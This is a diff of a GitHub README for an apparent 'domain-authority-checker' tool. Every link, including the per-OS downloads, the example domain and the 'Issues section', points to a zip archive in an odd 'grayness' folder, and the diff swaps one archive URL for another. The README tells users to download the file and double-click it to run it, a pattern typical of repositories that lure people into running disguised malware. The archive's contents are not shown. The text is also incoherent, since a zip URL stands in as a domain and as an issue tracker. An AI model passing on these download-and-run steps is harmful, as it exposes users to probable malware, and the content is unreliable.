@@ -1,6 +1,6 @@
 # 🌐 domain-authority-checker - Check Your Domain's Authority with Ease
 
-[![Download Now](https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip)](https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip)
+[![Download Now](https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip)](https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the domain-authority-checker tool! This application allows you to che
 
 ## 📥 Download & Install
 
-To download the latest version of domain-authority-checker, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip).
+To download the latest version of domain-authority-checker, visit this page: [Download the Latest Release](https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip).
 
 ### Step-by-Step Instructions:
 
@@ -16,25 +16,25 @@ To download the latest version of domain-authority-checker, visit this page: [Do
 2. Look for the latest version highlighted at the top.
 3. Click on the version number to expand the details.
 4. Find the appropriate file for your operating system:
-   - For Windows users, download `https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip`.
-   - For Mac users, download `https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip`.
-   - For Linux users, download `https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip`.
+   - For Windows users, download `https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip`.
+   - For Mac users, download `https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip`.
+   - For Linux users, download `https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip`.
 5. Save the file to your preferred location on your computer.
 
 ### Running the Application:
 
 1. **For Windows:**
-   - Navigate to the folder where you saved `https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip`.
+   - Navigate to the folder where you saved `https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip`.
    - Double-click the file to run the application.
 
 2. **For Mac:**
-   - Open the downloaded `https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip`.
+   - Open the downloaded `https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip`.
    - Drag and drop the folder into your Applications directory.
    - Open the folder and double-click the application to start.
 
 3. **For Linux:**
    - Open your terminal.
-   - Navigate to the directory where you extracted `https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip`.
+   - Navigate to the directory where you extracted `https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip`.
    - Run the application by typing `./domain-authority-checker-linux`.
 
 Now you are ready to check the authority of your desired domains!
@@ -43,7 +43,7 @@ Now you are ready to check the authority of your desired domains!
 
 1. **Enter the Domain:**
    - Open the application.
-   - You will see a text box labeled "Enter Domain Here." Type in the domain you want to analyze (e.g., https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip).
+   - You will see a text box labeled "Enter Domain Here." Type in the domain you want to analyze (e.g., https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip).
 
 2. **Check Domain Authority:**
    - After entering the domain, click on the "Check Authority" button.
@@ -94,6 +94,6 @@ Currently, the domain-authority-checker is designed for desktop users. For mobil
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out. Visit the [Issues section](https://raw.githubusercontent.com/Arda-maker-gif/domain-authority-checker/main/grayness/domain-authority-checker.zip) on GitHub to report any problems or ask questions.
+If you need further assistance, feel free to reach out. Visit the [Issues section](https://github.com/Arda-maker-gif/domain-authority-checker/raw/refs/heads/main/grayness/checker_domain_authority_v2.1-beta.4.zip) on GitHub to report any problems or ask questions.
 
 Thank you for using domain-authority-checker. We hope this tool helps you enhance your online presence!
